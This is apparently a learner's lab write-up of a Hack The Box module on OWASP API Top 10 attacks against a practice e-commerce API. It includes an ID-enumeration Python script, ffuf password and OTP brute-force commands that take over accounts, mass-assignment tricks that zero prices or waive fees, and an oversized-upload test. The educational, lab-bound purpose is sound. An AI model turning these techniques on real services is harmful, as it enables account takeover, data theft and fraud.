# HTB: API Attacks Module Summary

Module link: [https://academy.hackthebox.com/app/module/268](https://academy.hackthebox.com/app/module/268) 

In detail, this module will cover the following:

- `API1:2023 Broken Object Level Authorization`
- `API2:2023 Broken Authentication`
- `API3:2023 Broken Object Property Level Authorization`
- `API4:2023 Unrestricted Resource Consumption`
- `API5:2023 Broken Function Level Authorization`
- `API6:2023 Unrestricted Access to Sensitive Business Flows`
- `API7:2023 Server Side Request Forgery`
- `API8:2023 Security Misconfiguration`
- `API9:2023 Improper Inventory Management`
- `API10:2023 Unsafe Consumption of APIs`

# **Introduction to API Attacks**

## What are APIs?

APIs act as essential bridges in modern software, allowing different systems to communicate by following specific rules and protocols. They define how data is formatted, how resources are accessed, and how responses should look. They are generally categorized as:

- **Public:** Open to external developers and third parties.
- **Private:** Restricted to internal use within a specific organization.

---

### Common API Architectural Styles

While various styles exist, each serves different needs:

- [**REST](https://roy.gbiv.com/pubs/dissertation/fielding_dissertation.pdf#:~:text=This%20chapter%20introduces%20and%20elaborates%20the%20Representational%20State%20Transfer):** The most popular; it uses standard HTTP methods and is "stateless," meaning every request is independent.
- [**SOAP](https://www.w3.org/TR/2000/NOTE-SOAP-20000508/):** Highly standardized and secure, but complex; it relies strictly on XML.
- [**GraphQL](https://graphql.org/):** Highly flexible; allows clients to request only the specific data they need from a single endpoint.
- [**gRPC](https://grpc.io/):** Built for high performance; uses Protocol Buffers and is ideal for microservices.

---

### The Security Challenge

Because APIs are designed to exchange data seamlessly, they create a significant **attack surface**. Even though they are critical for integration, they are prone to several vulnerabilities, including:

- **Broken Authentication/Authorization:** Issues with verifying who a user is or what they are allowed to do.
- **Data Exposure:** Accidentally revealing sensitive information.
- **Rate Limiting:** Lack of control over how many requests a user can make, leading to abuse.
- **Misconfigurations:** Improper error handling or insecure settings that hackers can exploit.

### OWASP Top 10 API Security Risks

To categorize and standardize the security vulnerabilities and misconfigurations that APIs can face, [OWASP](https://owasp.org/) has curated the [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/), a comprehensive list of the most critical security risks specifically related to APIs:

| **Risk** | **Description** |
| --- | --- |
| [API1:2023 - Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/) | The API allows authenticated users to access data they are not authorized to view. |
| [API2:2023 - Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/) | The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access. |
| [API3:2023 - Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/) | The API reveals sensitive data to authorized users that they should 
not access or permits them to manipulate sensitive properties. |
| [API4:2023 - Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/) | The API does not limit the amount of resources users can consume. |
| [API5:2023 - Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/) | The API allows unauthorized users to perform authorized operations. |
| [API6:2023 - Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/) | The API exposes sensitive business flows, leading to potential financial losses and other damages. |
| [API7:2023 - Server Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/) | The API does not validate requests adequately, allowing attackers to
 send malicious requests and interact with internal resources. |
| [API8:2023 - Security Misconfiguration](https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/) | The API suffers from security misconfigurations, including vulnerabilities that lead to Injection Attacks. |
| [API9:2023 - Improper Inventory Management](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/) | The API does not properly and securely manage version inventory. |
| [API10:2023 - Unsafe Consumption of APIs](https://owasp.org/API-Security/editions/2023/en/0xaa-unsafe-consumption-of-apis/) | The API consumes another API unsafely, leading to potential security risks. |

## Lab Introduction

### Lab Context: Inlanefreight E-Commerce

The lab centers on a **multi-tenant RESTful web API** for a marketplace that connects customers with product suppliers.

- **Business Model:** Customers buy products from suppliers; the marketplace takes a fee from each transaction.
- **Account Types:** * **Suppliers:** Identified by `@pentestercompany.com` emails.
    - **Customers:** Identified by `@hackthebox.com` emails.

---

### Access Control Mechanism

The API uses **Role-Based Access Control (RBAC)**. A unique, simplified naming convention is used for these roles:

- **Direct Mapping:** A user’s role name matches the specific API endpoint they are allowed to access.
- **Example:** A user with the `Suppliers_GetAll` role is authorized to use the `/api/v1/suppliers` endpoint.

---

### Your Objective

You will act as a security researcher to:

1. **Identify & Exploit:** Test the API against the **OWASP API Top 10 Security Risks**.
2. **Document:** Create a detailed report of all discovered vulnerabilities.
3. **Classify:** Map each finding to its corresponding **CWE (Common Weakness Enumeration)** category to help the admin remediate the issues.

### Swagger API User Interface

Despite the frontend of `Inlanefreight E-Commerce Marketplace` still being in active development, the web API can be accessed via a [Swagger](https://swagger.io/tools/swagger-ui/) UI at the `/swagger` path (make sure to include it after the port of the spawned target machine). We will use this interface throughout the module to explore and assess the security of the marketplace's API, which includes over 60 endpoints:

![Swagger UI for Inlanefreight E-Commerce Marketplace API, version 1, OAS 3.0. Sections: Authentication, Customers, Products, Roles, Supplier-Companies, Suppliers.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/02_Introduction_to_Lab_Image_2.png)

The key entities that the marketplace encompasses include `Customers`, `Products`, `Supplier-Companies`, and `Suppliers`. We will also interact with other entities as we progress through the sections.

```bash
http://<Target-ip>:<port>/swagger
```

![Screenshot_2026-02-16_11_57_07.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/3ea59a33-a5d6-4b6d-8d75-12df89f3f773.png)

Each group has a specific api url for as shown under the Authentication and Customer section

![Screenshot_2026-02-16_11_56_54.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/b2981cf0-6a6f-4fb1-962c-9d53890edfd6.png)

Also here is the Roles endpoint  `/api/v1/roles/current-user` which is used to get the roles of currently authenticated user.

![Screenshot_2026-02-16_11_57_21.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/cebefa8c-7d44-416b-9df8-30b51fff4b22.png)

here if we try to access this endpoint, we will get `401 Unauthorized` error due to the lack of authorization we have. 

![Screenshot_2026-02-16_11_57_36.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/a6375648-c68a-4594-904f-240488d530d2.png)

# **OWASP API Security Top 10**

## API-1: **Broken Object Level Authorization**

### Authorization Bypass Through User-Controlled Key

The endpoint we will be practicing against is vulnerable to [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html).

### Scenario

The admin of `Inlanefreight E-Commerce Marketplace` has provided us with the credentials `htbpentester1@pentestercompany.com:HTBPentester1`, wanting us to assess what API vulnerabilities the user can exploit with their assigned roles.

Because the account belongs to a Supplier, we will utilize the `/api/v1/authentication/suppliers/sign-in` endpoint to sign in and obtain a JWT: (Click on the Authentication section and select the endpoint then pass the credentials)

```bash
curl -X 'POST' \
  'http://154.57.164.82:31180/api/v1/authentication/suppliers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester1@pentestercompany.com",
  "Password": "HTBPentester1"
}'
```

response:

```bash
{
  "jwt": "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzcxMjM0NzM4LCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.jfC9f-Gq86aHcBtmGMr5uKcGRF14-NetN0GXKyXwvovi3GB39ToMwwxHfBBWjYihK2mJgv4P4_8P1qtUj38bzw"
}
```

The format provided is a **JSON Web Token (JWT)**. It is a compact, URL-safe means of representing claims to be transferred between two parties—in this case, between the client and the **Inlanefreight API**.

A JWT is strictly composed of three parts separated by dots (`.`): **Header**, **Payload**, and **Signature**

```bash
{"alg":"HS512","typ":"JWT"}{"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier":"htbpentester1@pentestercompany.com","http://schemas.microsoft.com/ws/2008/06/identity/claims/role":"SupplierCompanies_GetYearlyReportByID","exp":1771234738,"iss":"http://api.inlanefreight.htb","aud":"http://api.inlanefreight.htb"}<Signature>
```

1. **The Header:**
    - This tells the server how the token is structured and signed:
        - **Algorithm (`alg`):** `HS512` (HMAC using SHA-512).
        - **Type (`typ`):** `JWT`.
2. **The Payload:**
    - This contains the "claims" or the actual data about the user. Based on the lab context, this payload contains:
        - **Name Identifier:** `htbpentester1@pentestercompany.com` (Confirming this is a **Supplier** account).
        - **Role:** `SupplierCompanies_GetYearlyReportByID`. Following the lab's naming convention, this user is authorized to access the `/api/v1/SupplierCompanies_GetYearlyReportByID` endpoint.
        - **Issuer (`iss`) & Audience (`aud`):** Both point to `http://api.inlanefreight.htb`.
        - **Expiration (`exp`):** A Unix timestamp indicating when the token becomes invalid.
3. **The Signature:**
    - This is the cryptographic hash. The server uses its private secret key to verify that the Header and Payload haven't been tampered with.
    - The server takes the **Encoded Header**, the **Encoded Payload**, and a **Secret Key** (which only the server knows), then runs them through a hashing algorithm (like `HS512` in your example).
    
    Mathematically, it looks like this:
    
    ```bash
    Signature=HMACSHA512(base64UrlEncode(header)+"."+base64UrlEncode(payload),secret_key)
    ```
    

![Screenshot_2026-02-16_12_37_54.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/9080aa3b-3c8a-42e9-a909-a87ad1d1bea2.png)

To authenticate using the JWT, we will copy it from the response and click the `Authorize` button. Note the lock icon, currently unlocked, indicating our non-authenticated status. Next, we will paste the JWT into the `Value` text field within the `Available authorizations` popup and click `Authorize`. Upon completion, the lock icon will be fully locked, confirming our authentication:

When examining the endpoints within the Suppliers group (notice how they have a lock at their right-most side, indicating that authentication is required), we will notice one named `/api/v1/suppliers/current-user`:

![Swagger UI for Suppliers API. Endpoints: Get all suppliers, get supplier by ID, count suppliers by name, get current user supplier, get all quarterly reports, get report by ID.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_5.png)

Endpoints containing `current-user` in their path indicate that they utilize the JWT of the currently authenticated user to perform the specified operation, which in this case is retrieving the 
current user's data. Upon invoking the endpoint, we will retrieve our current user's company `ID`, `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be`, a `Guid` value:

![Screenshot_2026-02-16_12_51_13.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/eecdd359-7e33-418f-b7f0-f5dd90857886.png)

```json
{
"supplier":
{
	"id":"c538adbb-2c74-447e-8029-54ecad6c5464",
	"companyID":"b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
	"name":"HTBPentester1",
	"email":"htbpentester1@pentestercompany.com",
	"phoneNumber":"+44 9999 999991"
	}
}
```

Retrieve the current user role from this endpoint `/api/v1/roles/current-user`

```json
{
  "roles": [
    "SupplierCompanies_GetYearlyReportByID",
    "Suppliers_GetQuarterlyReportByID"
  ]
}
```

In the `Supplier-Companies` group, we find an endpoint related to the role `SupplierCompanies_GetYearlyReportByID` that accepts a GET parameter: `/api/v1/supplier-companies/yearly-reports/{ID}`:

![Screenshot_2026-02-16_13_03_45.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/4bc3064b-742e-4afc-b207-c920a0a979ce.png)

```json
{
"supplierCompanyYearlyReport":
	{
	"id":1,
	"companyID":"f9e58492-b594-4d82-a4de-16e4f230fce1",
	"year":2020,
	"revenue":794425112,
	"commentsFromCLevel":"Superb work! The Board is over the moon! All employees will enjoy a dream vacation!"
	}
}
```

Here we can see we got a different CompanyID that does not belong to us, and when trying other IDs, we still can access yearly reports of other supplier-companies, allowing us to access potentially sensitive business data: 

### Exploiting `SupplierCompanies_GetYearlyReportByID` Role

Exploiting BOLA to view other companies’ reports by using our role to change the id endpoint. I created this Python code to automate the process and collect all the JSON results in a file.

```python
import requests
import json

# change this
URL = "http://<Target-ip>:<Target-port>/api/v1/supplier-companies/yearly-reports/"
HEADERS = {
	"Authorization": "Bearer 3J0QndC...etc", # change this 
	"accept": "application/json"
}

all_result = []

for id in range(1,20):
	full_url = f"{URL}{id}"
	req = requests.get(full_url, headers=HEADERS)

	if req.status_code == 200:
		data = req.json()
		print(f"Success For ID {id}")
		all_result.append(data)
	else:
		print(f"Connection error. Status Code:  {req.status_code}")
		print("Response Headers: ")
		print(json.dumps(dict(req.headers), indent=4))
		break

if len(all_result)!= 0:
	with open("result.json", 'w')as f:
			# json.dump handles the conversion from a py dict to a json formatted string
			json.dump(all_result, f, indent=4)
	print(f"The result saved in result.json")
```

### Exploiting `Suppliers_GetQuarterlyReportByID` Role

same as the first role, we were able to access other companies and retrieve thier infromation by changing the company ID, now we can do the same here. Get all the suppliers’ quarterly reports by changing the ID

```bash
/api/v1/suppliers/quarterly-reports/{ID}
```

 Note: when we change the ID to 1

![Screenshot_2026-02-16_14_45_06.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/309baac2-93c8-4b63-bbbf-3c12023f58c2.png)

we got a different supplier ID along with his data, which means that this endpoint is also vulnerable to BOLA. I used the same Python script and changed the URL and the saved file 

```python
import requests
import json

URL = "http://154.57.164.76:31222/api/v1/suppliers/quarterly-reports/" # change this
HEADERS = {
	"Authorization": "Bearer ---- ", # change this
	"accept": "application/json"
}

all_result = []

for id in range(1,20):
	full_url = f"{URL}{id}"
	req = requests.get(full_url, headers=HEADERS)

	if req.status_code == 200:
		data = req.json()
		print(f"Success For ID {id}")
		all_result.append(data)
	else:
		print(f"Connection error. Status Code:  {req.status_code}")
		print("Response Headers: ")
		print(json.dumps(dict(req.headers), indent=4))
		break

if len(all_result)!= 0:
	with open("suppliers-quarterly-reports.json", 'w')as f:
			# json.dump handles the conversion from a py dict to a json formatted string
			json.dump(all_result, f, indent=4)
	print(f"The result saved in suppliers-quarterly-reports.json")
```

**Note**: I tried to use the company ID to send a GET request to this endpoint (`/api/v1/supplier-companies/{ID}`) but the server retuned `403 forbidden error`  I guess that because the server compares our role to the role required to request this endpoint, which is set to → **`SupplierCompanies_Get` Also Note ,** in the introduction section, it said that the API **uses Role-Based Access Control (RBAC)** as an access control mechanism  ****

### Prevention

To mitigate the `BOLA` (Broken Object Level Authorization) vulnerability, the endpoint `/api/v1/supplier-companies/yearly-reports` should implement a verification step (at the source code level) to ensure that authorized users can only access yearly reports associated with their affiliated company. This verification involves comparing the `companyID` field of the report with the authenticated supplier's `companyID`. Access should be granted only if these values match; otherwise, the request should be denied. This approach effectively maintains data segregation between supplier companies’ yearly reports.

## API-2: Broken Authentication

Web APIs utilize various [authentication](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) mechanisms to ensure data confidentiality. An API suffers
 from `Broken Authentication` if any of its authentication mechanisms can be bypassed or circumvented.

### Improper Restriction of Excessive Authentication Attempts

The endpoint we will be practicing against is vulnerable to [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html).

### Scenario

The admin of `Inlanefreight E-Commerce Marketplace` has provided us with the credentials `htbpentester3@hackthebox.com:HTBPentester3`, wanting us to assess what API vulnerabilities can the user exploit with their assigned roles.

Because the account belongs to a customer, we will utilize the `/api/v1/authentication/customers/sign-in` endpoint to obtain a JWT and then authenticate with it.

---

1. **Retrieve the current customer information**

when invoked `/api/v1/customers/current-user` we get back the information of our currently authenticated user:

```bash
{
  "customer": {
    "id": "3d6b5aba-302b-4c50-a90a-088307d0b637",
    "name": "HTBPentester3",
    "email": "htbpentester3@hackthebox.com",
    "phoneNumber": "+44 9999 999993",
    "birthDate": "1995-06-21"
  }
}
```

---

1. **Test-2: Retrieve the roles we have:** 

```python
{
  "roles": [
    "Customers_UpdateByCurrentUser",
    "Customers_Get",
    "Customers_GetAll"
  ]
}
```

endpoints that are allowed based on our role: 

```bash
/api/v1/customers        # get all the customers
/api/v1/customers/{ID}   # get customer information by id  
/api/v1/customers        # update the current authenticated user
```

---

1. **Retrieve all the customers’ information based on our role**

`Customers_GetAll` allows us to use the `/api/v1/customers` endpoint, which returns the records of all customers:

![GET request for /api/v1/customers. Response: List of customers with details including ID, name, email, phone number, and birth date.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_4.png)

Although the endpoint suffers from `Broken Object Property Level Authorization` (which we will cover in the upcoming section) because it exposes sensitive information about other customers, such as `email`, `phoneNumber`, and `birthDate`, it does not directly allow us to hijack any other account.

---

1. **Retrieve a specific customer**

`Customers_Get`allows us to use the `/api/v1/customers/{guid}` endpoint, which returns the records of a customer based on their guid that we retrieved from `/api/v1/customers` :

![Screenshot_2026-02-16_15_49_10.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/d44e0cf4-584c-4b4e-84d6-faee935860dc.png)

---

1. **Update the current Customer Information**

`Customers_UpdateByCurrentUser`allows us to update customers’ data on this endpoint → `/api/v1/customers/current-user` . **Note: This feature is to modify the current user, NOT other users**

When I tried to use this password `Pass` But it returns an error saying that we must use a password 6 characters long, which indicates a weak password policy

![PATCH request for /api/v1/customers/current-user. Response: Error 400, password must be at least 6 characters long.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API2_2023_Broken_Authentication_Image_6.png)

Given that the API has a weak password policy, other customer accounts may have used cryptographically insecure passwords during registration. Therefore, we will perform password brute-forcing against customers using `ffuf`.

---

1. **Password Bruteforce**

First, we need to obtain the (fail) message that the `/api/v1/authentication/customers/sign-in` endpoint returns when provided with incorrect credentials, which in this case is 'Invalid Credentials'

![Screenshot_2026-02-16_16_45_31.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/c726ef6e-bf96-47a3-9baa-60c490878a2c.png)

Instead of attacking all 107 customers, the admin of `Inlanefreight E-Commerce Marketplace` has provided us with the emails of three high-value targets (which we need to save in a file):

- `OlawaleJones@yandex.com`
- `IsabellaRichardson@gmail.com`
- `WenSalazar@zoho.com`

For the password wordlist, we will use [xato-net-10-million-passwords-10000](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt) from [SecLists](https://github.com/danielmiessler/SecLists/tree/master).

Because we are fuzzing two parameters at the same time (which are the email and password), we need to use the `-w` flag of `ffuf` and assign the keywords `EMAIL` and `PASS` to the customer emails and passwords wordlists 

```bash
$ ffuf -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt:PASS -w emails.txt:EMAIL -u "http://154.57.164.66:30763/api/v1/authentication/customers/sign-in" -X POST -d '{"Email": "EMAIL", "Password": "PASS"}'  -H "Content-Type: application/json" -fr "Invalid Credentials" -t 100 -s
EMAIL : IsabellaRichardson@gmail.com PASS : qwerasdfzxcv 
                                                           
```

---

1. **OTP Brute-Force** 

To try brute-forcing OTP we first need to authenticate to the website, then send a password reset for the email we want to test.

```bash
curl -X 'POST' \
  'http://154.57.164.78:31148/api/v1/authentication/customers/passwords/resets/email-otps' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "MasonJenkins@ymail.com"
}'
```

Second, use `ffuf` to fuzz for the OTP field and filter for `false` status

```bash
$ ffuf -w /usr/share/wordlists/SecLists/Fuzzing/4-digits-0000-9999.txt:FUZZ \
-u "http://154.57.164.78:31148/api/v1/authentication/customers/passwords/resets" \
-X POST \
-H "Content-Type: application/json" \
-d '{"Email":"MasonJenkins@ymail.com","OTP":"FUZZ","NewPassword":"NewP@ssw0rd1"}' \
-fr "false" \
-replay-proxy 'http://127.0.0.1:8080/' -s
7261

```

Result

![Screenshot_2026-02-17_15_54_39.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/66bc0c3e-9ee0-4243-a169-2d1e9c738829.png)

Now we can login with the new password and retrieve the flag from this endpoint → `/api/v1/customers/payment-options/current-user`

![Screenshot_2026-02-17_15_56_22.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/7088816a-285f-449c-a01a-f0bb07a8b9e6.png)

## **API-3: Broken Object Property Level Authorization**

`Broken Object Property Level Authorization` is a category of vulnerabilities that encompasses two subclasses: `Excessive Data Exposure` and `Mass Assignment`.

An API endpoint is vulnerable to `Excessive Data Exposure` if it reveals sensitive data to authorized users that they are not supposed to access.

On the other hand, an API endpoint is vulnerable to `Mass Assignment` if it permits authorized users to manipulate sensitive object properties beyond their authorized scope, including modifying, adding, or deleting values.

---

### **1. Exposure of Sensitive Information Due to Incompatible Policies**

The first endpoint we will be practicing against is vulnerable to [CWE-213](https://cwe.mitre.org/data/definitions/213.html), `Exposure of Sensitive Information Due to Incompatible Policies`.

### Scenario

The admin of `Inlanefreight E-Commerce Marketplace` has provided us with the credentials `htbpentester4@hackthebox.com:HTBPentester4`, wanting us to assess what API vulnerabilities the user can exploit with their assigned roles.

After invoking `/api/v1/authentication/customers/sign-in` to sign in as a customer and obtain a JWT, the `/api/v1/roles/current-user` endpoint shows that we have the roles `Suppliers_Get` and `Suppliers_GetAll`:

It is typical for e-commerce marketplaces to allow customers to view supplier details. However, after invoking the `/api/v1/suppliers` `GET` endpoint, we notice that the response includes not only the `id`, `companyID`, and `name` fields but also the `email` and `phoneNumber` fields of the suppliers:

![Screenshot_2026-03-24_21_25_46.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/f8a506b7-3aff-48d8-bc43-fde8f500ff70.png)

These sensitive fields should not be exposed to customers, as this allows them to circumvent the 
marketplace entirely and contact suppliers directly to purchase goods  (at a discounted price). Additionally, this vulnerability benefits suppliers financially by enabling them to generate greater revenues without paying the marketplace fee. However, for the stakeholders of `Inlanefreight E-Commerce Marketplace`, this will negatively impact their revenues.

### Prevention

To mitigate the `Excessive Data Exposure` vulnerability, the `/api/v1/suppliers` endpoint should only return fields necessary from the customers'  perspective. This can be achieved by returning a specific response [Data Transfer Object (DTO)](https://en.wikipedia.org/wiki/Data_transfer_object) that includes only the fields intended for customer visibility, rather than exposing the entire domain model used for database interaction.

---

### **2. Improperly Controlled Modification of Dynamically-Determined Object Attributes**

The second API endpoint we will be practicing against is vulnerable to [CWE-915](https://cwe.mitre.org/data/definitions/915.html), `Improperly Controlled Modification of Dynamically-Determined Object Attributes`.

### Scenario

The admin of `Inlanefreight E-Commerce Marketplace` has provided us with the credentials `htbpentester6@pentestercompany.com:HTBPentester6`, wanting us to assess what API vulnerabilities the user can exploit with their assigned roles.

After invoking `/api/v1/authentication/suppliers/sign-in` to sign in as a Supplier and obtain a JWT, the `/api/v1/roles/current-user` endpoint shows that we have the roles:

```json
{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_Get"
  ]
}
```

The `/api/v1/supplier-companies/current-user` endpoint shows that the supplier-company the currently authenticated supplier belongs to, 'PentesterCompany', has the `isExemptedFromMarketplaceFee` field set to `0`, which equates to `false`:

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

When expanding the `/api/v1/supplier-companies` `PATCH` endpoint, we notice that it requires the `SupplierCompanies_Update` role, states that the supplier performing the update must be a staff member, and allows sending a value for the `isExemptedFromMarketplaceFee` field:

![Screenshot_2026-03-24_21_40_56.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/79c940d3-a7b6-4b3f-85c7-875c0fdc05ad.png)

Let us set it to `1`, such that 'PentesterCompany' does not get included in the companies 
required to pay the marketplace fee; after invoking it, the endpoint returns a success message:

![Screenshot_2026-03-24_21_43_25.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/7c86a088-4bdd-4814-be83-13d32af1667b.png)

Then, when checking our company info again using `/api/v1/supplier-companies/current-user`, we will notice that the `isExemptedFromMarketplaceFee` field has become `1`:

![Screenshot_2026-03-24_21_44_28.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/e1915b34-1cc2-482c-8044-3b23d44da5a7.png)

Because the endpoint mistakenly allows suppliers to update the value of a field that they should not have access to, this vulnerability allows supplier-companies to generate more revenue from all sales performed over the `Inlanefreight E-Commerce Marketplace`, as they will not be charged a marketplace fee. However, similar to the repercussions of the previous `Exposure of Sensitive Information Due to Incompatible Policies` vulnerability, the revenues of the stakeholders of `Inlanefreight E-Commerce Marketplace` will be negatively impacted.

### Prevention

To mitigate the `Mass Assignment` vulnerability, the `/api/v1/supplier-companies` `PATCH` endpoint should restrict invokers from updating sensitive fields. Similar to addressing `Excessive Data Exposure`, this can be achieved by implementing a dedicated request `DTO` that includes only the fields intended for suppliers to modify.

### Exercise:

**Exploit another Mass Assignment vulnerability and submit the flag.**

with the credentials we got, view the authorization we have

```json
{
  "roles": [
    "CustomerOrders_GetByID",
    "CustomerOrders_Create",
    "CustomerOrderItems_Get",
    "CustomerOrderItems_Create"
  ]
}
```

`/api/v1/customers/current-user`  get the customer data of the currently authenticated customer

```json
{
  "customer": {
    "id": "123b878e-6b8a-425f-bd5e-3ba415ce8727",
    "name": "HTBPentester7",
    "email": "htbpentester7@hackthebox.com",
    "phoneNumber": "+44 9998 999997",
    "birthDate": "1995-06-21"
  }
}
```

`/api/v1/customers/orders` → Create a new customer order using the ID of the currently authenticated customer, which requires the role → `CustomerOrders_Create` we will need this to create a customer order item

![Screenshot_2026-03-24_22_00_42.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/24038127-4d8d-4260-b2e1-5d22682f940f.png)

```json
{
  "id": "7cd059f3-e1e1-4adb-8adb-306edbb0b9a6"
}
```

`/api/v1/customers/orders/current-user`  Get all customer orders of the currently authenticated customer, which will return our order we made from this endpoint → `/api/v1/customers/orders`

```json
{
  "customerOrders": [
    {
      "id": "7cd059f3-e1e1-4adb-8adb-306edbb0b9a6",
      "customerID": "123b878e-6b8a-425f-bd5e-3ba415ce8727",
      "date": "2026-03-24"
    }
  ]
}
```

lastly we need a product ID, we can got this by sending a GET request to this endpoint →  `/api/v1/products` to return all the available products

![Screenshot_2026-03-24_22_17_10.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/3fc6231c-0be3-4706-9d5a-982d555d69e8.png)

`/api/v1/customers/orders/items`  → add a new item in the customer order, role required `CustomerOrderItems_Create`. Now, here is where the vulnerability is: after we created a new customer order ID, which is this:

```json
{
  "id": "7cd059f3-e1e1-4adb-8adb-306edbb0b9a6"
}
```

and pick any product ID, we can manipulate the `NetSum` field which is used to set a price on the product we order, and we can set the price to 0 for a 0 charge

![Screenshot_2026-03-24_22_21_45.png](/HTB/Web_Penetration_Tester/API_Attacks/Images/5322cffd-1874-4879-b867-3df3eb00ce2d.png)

## API-4: **Unrestricted Resource Consumption**

File upload and download are fundamental features in all applications. For instance, in e-commerce marketplaces, suppliers require the ability to upload product images, while users need to view and download these files.

A web API is vulnerable to `Unrestricted Resource Consumption` if it fails to limit user-initiated requests that consume resources such as `network bandwidth`, `CPU`, `memory`, and `storage`. These resources incur significant costs, and without adequate safeguards—particularly effective `rate-limiting`—against excessive usage, users can exploit these vulnerabilities and cause financial damage.

---

### 1. Uncontrolled Resource Consumption

The endpoint we will be practicing against is vulnerable to [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html).

### Scenario

The admin of `Inlanefreight E-Commerce Marketplace` has provided us with the credentials `htbpentester8@pentestercompany.com:HTBPentester8`, wanting us to assess what API vulnerabilities the user can exploit with their assigned roles.

After invoking `/api/v1/authentication/suppliers/sign-in` to sign in as a supplier and obtain a JWT, the `/api/v1/roles/current-user` endpoint shows that we have the roles:

```json
{
  "roles": [
    "SupplierCompanies_Get",  // Get a supplier company
    "SupplierCompanies_UploadCertificateOfIncorporation"  // upload a suppliers' company certification of Incorporation
  ]
}
```

Checking the Supplier-Companies group, we notice only one endpoint related to the second role: the `/api/v1/supplier-companies/certificates-of-incorporation` `POST` endpoint. When expanding it, we see that it requires the `SupplierCompanies_UploadCertificateOfIncorporation`
 role and allows the staff of a supplier company to upload its certificate of incorporation as a PDF file, storing it on disk indefinitely:

![POST request for /api/v1/supplier-companies/certificates-of-incorporation. Role required: SupplierCompanies_UploadCertificateOfIncorporation. Upload PDF file and provide CompanyID. No file chosen.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API4_2023_Unrestricted_Resource_Consumption_Image_3.png)

Let us attempt to upload a large PDF file containing random bytes. First, we will use `/api/v1/supplier-companies/current-user` to get the supplier-company ID of the currently authenticated user:

```json
{
  "supplierCompany": {
    "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "PentesterCompany",
    "email": "supplier@pentestercompany.com",
    "isExemptedFromMarketplaceFee": 0,
    "certificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
  }
}
```

Next, we will use [dd](https://man7.org/linux/man-pages/man1/dd.1.html) to create a file containing 30 random megabytes and assign it the `.pdf` extension:

```bash
$ dd if=/dev/urandom of=CertificateOfIncorporation.pdf bs=1M count=30
30+0 records in
30+0 records out
31457280 bytes (31 MB, 30 MiB) copied, 0.0595664 s, 528 MB/s
```

After invoking the endpoint, we notice that the API returns a successful upload message, along with the size of the uploaded file:

